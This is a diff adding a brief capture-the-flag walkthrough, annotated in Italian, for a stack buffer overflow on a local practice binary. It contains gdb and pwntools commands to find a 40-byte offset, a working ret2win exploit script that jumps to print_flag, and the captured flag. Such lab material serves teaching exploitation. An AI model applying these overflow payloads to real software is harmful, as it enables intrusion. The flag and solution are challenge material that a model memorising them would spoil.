@@ -1,0 +1,23 @@
+checksec hi
+gdb hi
+info functions e Annota indirizzo funzione print_flag
+python3 -c "from pwn import *; print(cyclic(100))" > pattern
+gdb hi
+run < pattern 
+info registers Copia valore di: RBP
+python3 -c "from pwn import *; print(cyclic_find(p64(VALORE), n=8))" 32 byte buffer + 8 byte saved RBP = 40 byte return address = offset
+nano exploit.py = 
+from pwn import *
+
+p = process('./hi')
+
+offset = 40
+target = 0x0000000000400637   # print_flag
+
+payload = b"A"*offset + p64(target)
+
+p.sendline(payload)
+p.interactive()
+
+python3 exploit.py
+Hey, how did you get here?! BTW, flag: ccit{hi_i_am_a_flag}
